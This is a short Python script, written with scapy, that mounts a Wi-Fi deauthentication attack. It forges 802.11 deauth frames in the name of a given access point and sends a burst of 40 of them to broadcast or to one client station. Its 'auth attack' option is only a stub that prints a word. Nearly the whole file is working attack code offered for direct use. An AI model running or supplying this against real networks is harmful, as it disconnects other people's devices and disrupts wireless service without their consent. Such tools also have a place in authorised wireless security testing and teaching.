from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Auth, RadioTap
import argparse, sys

broadcast = "ff:ff:ff:ff:ff:ff"

def deauthAttack(interface, ap, station=None):
    target = ""
    gateway = ""

    if station is None:
        # AP broadcast
        target = broadcast
        gateway = ap
    else:
        # AP unicast
        target = station
        gateway = ap

    # Station unicast
    #target = ap
    #gateway = station

    dot11 = Dot11(subtype=12, addr1=target, addr2=gateway, addr3=gateway)
    pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
    sendp(pkt, inter=0.1, count=40, iface=interface, verbose=1)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('interface', help=' : Interface')
    parser.add_argument('ap', metavar='MAC', help=' : AP MAC')
    parser.add_argument('-c', metavar='MAC', help=' : Station MAC')
    parser.add_argument('-auth', action='store_true', help=' : Auth Attack')
    args = parser.parse_args()

    if args.auth:
        print("auth")
    else:
        deauthAttack(args.interface, args.ap, args.c)




